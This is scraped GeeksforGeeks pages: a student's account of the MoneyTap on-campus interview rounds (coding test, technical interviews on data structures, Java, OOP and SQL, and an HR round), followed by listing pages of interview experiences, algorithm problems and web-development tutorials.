QuestionsCommonly Asked Java Programming Interview Questions | Set 2How I cracked TCS DigitalMicrosoft's most asked interview questionsTCS NQT Coding Questions & How Coding Task Evaluated in TCS NQTDirecti Interview | Set 7 (Programming Questions)TCS Digital Interview QuestionsGoogle Interview QuestionsAmazon Recruitment ProcessGoogle Online Challenge 2020How to write an Interview Experience?Zoho Interview | Set 3 (Off-Campus)Amazon SDE-1 Interview Experience | Amazon WOW-2020Adobe Interview Experience | SHECODES-Software EngineerJP Morgan Chase & Co. (JPMC) Interview Experience | (Full time Software Engineer)NCR Corporation (On-Campus Recruitment Drive)Accenture On Campus 2020 Placement DriveGoldman Sachs Interview Experience | Set 33 (For Experienced)Cognizant Interview Experience | Set 2 (On-Campus)Accenture Campus Placement Drive 2020TCS Ninja Interview Experience and Interview QuestionsCapgemini Virtual Hiring (New process) | 2021 BatchAccenture Interview Experience | Set 1 (On-Campus)Adobe Interview | Set 13 (On Campus for Internship)Amazon Interview | Set 44 (For Internship)ZS Associates Interview Experience | Set 1 (Technology Analyst - On Campus)Cognizant Interview Experience - Programmer Analyst TraineeTCS Interview Experience | Set 1 (On-Campus 2014)MathWorks Interview Experience (EDG, Oncampus) MoneyTap Interview Experience (On-Campus 2020) Last Updated: 21-12-2020 Round 1(Assessment Test): This was the first test. In this round, there were a total of 14 MCQ and 4 Coding Questions. MCQ question was belongs to : DBMS OS Java C/CPP Snippet coding question Whereas one debugging question and 3 codings question easy to moderate level. I have to remember one question was the implementation of HashMap in java. In this test, the total participate candidate was approx 450 after this round total of only 12 candidates shortlisted including me. Note: please keep in mind PPT must attend by this company otherwise you will not shortlist for the assessment test. If PPT happens. Round 2(Technical Round 1): This round was very interesting. The interviewer was very friendly. Firstly he asked introduction of myself and I told Within 2 min. Actually, the Interviewer found excellent knowledge in data structure and algorithm and problem-solving skills. He asked a coding question that was the Next greater element of the array.https://www.geeksforgeeks.org/next-greater-element/ I told the algorithm about this problem and after that, he told me that write a code in an online editor I wrote and run successfully. He is very impressed with me. After that, he asked me some theoretical of DBMS and networking. This round was approx 30 min. After this round, only one candidate out of 12 was selected for the next round that was I. Round 3(Technical Round 2): This round was more interesting than the second. The interviewer wants deeply knowledge in data structure and algorithm, java, DBMS, collection in java, SQL, OOPs concept. Firstly he asked me which programming language you know and give a rating for that. I told java and 8 with the rating. After that he started with a coding question there was a total of two coding questions asked. Find the median from the linked list in an optimal way. Check a tree is BST or not. I told the algorithm for both in an optimal way and wrote code in the online editor and run. After that, he jumped on collection in java and asked more deeply question from there. He basically asked array list and vector in java how it is implemented and how increased there size Automatically. (What is a dynamic array in java). I told him all the answers to his question. After that, he jumped on the oops concept in java. And asked what is runtime polymorphism in java and how can we implement? He told write code for runtime polymorphism. And then he asked for data abstraction in java. And more OOPs concept. After that he jumped on DBMS he creates two tables and asked to join SQL query and more SQL query such as Delete record, Modify table, Truncate command, etc. This round was approx 1 hour 30 min. After this round, I got mail for an HR interview. Round 4(HR Round): HR was very friendly. She asked me about my family background. And what do you know about MoneyTap? After that, she told congratulation You are selected. I was very happy. After that, she told me about the CTC breakup. Finally, I selected for this job. Best of luck and Thank you. Note: Before the HR round you must have knowledge about MoneyTap. This company is more preferable for java language. Write your Interview Experience or mail it to contribute@geeksforgeeks.org My Personal Notes arrow_drop_up Save Recommended Posts:MathWorks Interview Experience (EDG, Oncampus)ServiceNow Interview Experience OncampusUHG Interview Experience | OnCampus- 2019InfoEdge Interview Experience | OnCampus-2019Mahindra Comviva Interview Experience ( On-Campus 2020 )Wipro Interview Experience | Wipro Elite NTH-2020 batch - Off CampusAdobe Interview Experience for 2020 InternshipWipro Elite 2020 Interview ExperienceMicrosoft Interview Experience (SDE Intern-2020-On Campus )Epam Interview Experience for Junior Software Engineer(2020 graduates)EPAM Systems Interview Experience For Junior Software Engineer (2020 Graduates)Microsoft Interview Experience (FTE SDE 2020- On Campus)Amazon Interview Experience for Summer Internship 2020(On-Campus)IVTL Infoview Interview Experience - How I got selected! (BE - 2020 Batch)Cognizant Interview Experience for 2020 Passout-BATCHNagarro(Gurgaon) Interview Experience for 2020 batchDaffodils Interview Experience for 2020 batchCognizant Interview Experience(On Campus for batch 2020)TCS Ninja Interview Experience CSE 2020TCS NQT (2019-2020) Interview ExperienceIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Interview ExperiencesMoneyTapOn-Campus thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Blogvault Interview Experience (On-Campus 2020) Next last_page NCR Corporation Interview Experience for SDE (On-Campus) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Interview Experiences Cognizant Interview Experience for GenC (On-Campus)Amazon Interview Experience for System Development Engineer (On-Campus Dec 2020)HashedIn Interview Experience (On-Campus 2020)Meesho Interview ExperienceAvalara Technologies Interview Experience for FTE SDE | On-Campus More related articles in Interview Experiences Accenture Interview Experience (On-Campus)Google Interview Experience for Software Engineer 2021 New GradJosh Technology Group Interview Experience for SD (On-Campus)Udaan Interview ExperienceAmazon Interview Experience for SDE-Intern | On-Campus 2021 room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

MoneyTap Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ MoneyTap Interview Experience (On-Campus 2020) Tag Archives: MoneyTap MoneyTap Interview Experience (On-Campus 2020) Last Updated: 21-12-2020 Round 1(Assessment Test): This was the first test. In this round, there were a total of 14 MCQ and 4 Coding Questions. MCQ question… Read More » Interview ExperiencesMoneyTapOn-Campus Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most visited in MoneyTap Find the duration of difference between two dates in JavaHow to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GeeksforGeeks | A computer science portal for geeks | Page 2 Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Blogvault Interview Experience (On-Campus 2020) Last Updated: 21-12-2020 Round 1: It happened in Dec 2020. Online coding round of 2 hours on Interviewbit platform, and three questions. Students who completed 2 questions or… Read More » Interview ExperiencesBlogvaultOn-Campus Cognizant Interview Experience for GenC (On-Campus) Last Updated: 21-12-2020 Cognizant is hiring this year through an on-campus drive for selected colleges, this year due to COVID the hiring process is online. According to a… Read More » Interview ExperiencesCognizantOn-Campus Swiggy Interview Experience for SDE-1 (Bangalore 1.5 Years Experienced) Last Updated: 21-12-2020 Online Coding Test (Hackerrank): Questions were of Easy, Medium, and Hard level, 4 questions in total you need to solve in 1.5 hrs. Round 1(On-site,… Read More » ExperiencedInterview ExperiencesSwiggy ABB Interview Experience (Placement 2020) Last Updated: 21-12-2020 I participated in the placement drive of ABB recently for the post of Software Engineer. (Time frame is given below for reference) It was a… Read More » ExperiencedInterview ExperiencesABB Group Infosys SES Interview Experience | HackWithInfy 2020 Last Updated: 21-12-2020 Infosys conducts Hack With Infy challenge every year across the country. We can get placed in Infosys if we give a decent performance. Platform: Hacker… Read More » Interview ExperiencesHackWithInfyInfosysInfosys-interview-experience Fasal Interview Experience for Product Engineering Internship (6 Months) | Off-Campus 2021 Last Updated: 21-12-2020 Recently I interviewed with Fasal for 6 months internship as a Product Engineering Intern. I applied to Fasal through Linkedin and was fortunate enough to… Read More » InternshipInterview ExperiencesFasalOff-Campus TCS NQT Digital Interview Experience 2020 Last Updated: 20-12-2020 Round 1: TCS conducted the first round of NQT on 28th Oct 2020. The test was conducted on the TCS ion platform. There were questions… Read More » Interview ExperiencesTCSTCS-interview-experience Print path from a node to root of given Complete Binary Tree Last Updated: 21-12-2020 Given an integer N, the task is to find the path from the Nth node to the root of a Binary Tree of the following… Read More » GreedyMathematicalTreeDFSinterview-preparationNumbers Maximize the common difference of an AP having the given array as a subsequence Last Updated: 21-12-2020 Given a sorted array arr[] consisting of N distinct elements, the task is to find the maximum possible common difference of an arithmetic progression such… Read More » ArraysGreedyMathematicalarithmetic progressionArithmetic ProgressionsMaths Sum of maximum of all subarrays by adding even frequent maximum twice Last Updated: 20-12-2020 Given an array arr[] consisting of N integers (All array elements are a perfect power of 2), the task is to calculate the sum of… Read More » ArraysBit MagicMathematicalSearchingfrequency-countingmaths-powersetBitCountsubarray Minimize the maximum difference of any pair by doubling odd elements and reducing even elements by half Last Updated: 21-12-2020 Given an array arr[] consisting of N positive integers, the task is to minimize the maximum difference between any pair of array elements by multiplying… Read More » ArraysHashMathematicalarray-rearrangecpp-setNatural Numbers Smallest number whose sum of digits is N and every digit occurring at most K times Last Updated: 20-12-2020 Given two positive integers N and K, the task is to find the smallest number whose sum of digits is N and every distinct digit… Read More » GreedyMathematicalnumber-digitsNumbers XOR of all even numbers from a given range Last Updated: 21-12-2020 5 Given two integers L and R, the task is to calculate Bitwise XOR of all even numbers in the range [L, R]. Examples: Example: Input: L… Read More » Bit MagicMathematicalBitwise-XOR Count pairs of indices having equal prefix and suffix sums Last Updated: 21-12-2020 Given an array arr[] of length N, the task is to find the count of pairs of indices (i, j) (0-based indexing) such that prefix… Read More » ArraysHashMathematicalSearchingprefix-sumsubarraysubarray-sumsuffix-sum How to make Mini vertical selects using jQuery Mobile ? Last Updated: 20-12-2020 jQuery Mobile is a web based technology used to make responsive content that can be accessed on all smartphones, tablets and desktops. In this article,… Read More » HTMLJQueryWeb TechnologiesjQuery-Mobile Page 2 of 5,466«12345...102030...»Last » Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GeeksforGeeks | A computer science portal for geeks | Page 3 Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Understanding Quadrilaterals – Measures of the Exterior Angles of a Polygon Last Updated: 21-12-2020 Polygon is a closed, connected shape made of straight lines. It may be a flat or a plane figure spanned across two-dimensions. A polygon is… Read More » Class 8School LearningSchool MathematicsQuadrilaterals Slope-Intercept Form of Straight Lines Last Updated: 21-12-2020 Straight lines can be viewed as a point extended indefinitely in any two opposite directions. A straight line is one that has no curves and covers… Read More » Class 11School LearningSchool Mathematics Geometric Sequence and Series Last Updated: 21-12-2020 A sequence is defined as an arrangement of numbers in a particular order, i.e., an ordered list of numbers. For example: 1, 3, 5, 7,… Read More » Class 11School LearningSchool MathematicsSequence and Series Areas Related to Circles – Perimeter of circular figures, Areas of sector and segment of a circle & Areas of combination of plane figures Last Updated: 21-12-2020 A circle is a shape consisting of a curved line completely surrounded by an area. The circle contains points in the plane which are at… Read More » Class 10School LearningSchool MathematicsCircles Types of Quadrilaterals – Some Special Parallelograms Last Updated: 21-12-2020 Quadrilaterals can be defined as, types of polygons that have four sides, four vertices, and four angles along with a pair of diagonals. The Sum… Read More » Class 8School LearningSchool MathematicsQuadrilaterals How to make Mini vertical selects using jQuery Mobile ? Last Updated: 20-12-2020 jQuery Mobile is a web based technology used to make responsive content that can be accessed on all smartphones, tablets and desktops. In this article,… Read More » HTMLJQueryWeb TechnologiesjQuery-Mobile How to create a Disabled Option Select using jQuery Mobile ? Last Updated: 20-12-2020 jQuery Mobile is a web-based technology used to make responsive content that can be accessed on all smartphones, tablets, and desktops. In this article, we… Read More » HTMLJQueryWeb TechnologiesjQuery-Mobile How to make Mini sized Grouped button footer using jQuery Mobile ? Last Updated: 20-12-2020 jQuery Mobile is a web based technology used to make responsive content that can be accessed on all smartphones, tablets and desktops. In this article,… Read More » HTMLJQueryWeb TechnologiesjQuery-Mobile How to create a Mini sized selects using jQuery Mobile ? Last Updated: 20-12-2020 jQuery Mobile is a web-based technology used to make responsive content that can be accessed on all smartphones, tablets, and desktops. In this article, we… Read More » HTMLJQueryWeb TechnologiesjQuery-Mobile How to create top positioned icon selects using jQuery Mobile ? Last Updated: 21-12-2020 jQuery Mobile is a web-based technology used to make responsive content that can be accessed on all smartphones, tablets and desktops. In this article, we… Read More » HTMLJQueryWeb TechnologiesjQuery-Mobile script.aculo.us Sliders setDisabled Option Last Updated: 20-12-2020 The script.aculo.us library is a cross-browser library that aims at improving the user interface of a website. The Slider controls are thin tracks that allow the… Read More » JavaScriptWeb Technologiesscript.aculo.us How to create right positioned icon selects using jQuery Mobile ? Last Updated: 21-12-2020 jQuery Mobile is a web-based technology used to make responsive content that can be accessed on all smartphones, tablets and desktops. In this article, we… Read More » HTMLJQueryWeb TechnologiesjQuery-Mobile Design a web page using HTML and CSS Last Updated: 20-12-2020 Creating an attractive page will be difficult for those who are not experts in CSS. Without using CSS, you will not be able to make… Read More » CSSHTMLWeb TechnologiesWeb technologies QuestionsCSS-MiscHTML-Misc How to make Vertical selects using jQuery Mobile ? Last Updated: 20-12-2020 jQuery Mobile is a web based technology used to make responsive content that can be accessed on all smartphones, tablets and desktops. In this article,… Read More » HTMLJQueryWeb TechnologiesjQuery-Mobile How to make Form element Rangeslider using jQuery Mobile ? Last Updated: 20-12-2020 jQuery Mobile is a web based technology used to make responsive content that can be accessed on all smartphones, tablets and desktops. In this article,… Read More » HTMLJQueryWeb TechnologiesjQuery-Mobile Page 3 of 5,468«12345...102030...»Last » Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GeeksforGeeks | A computer science portal for geeks | Page 4 Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython 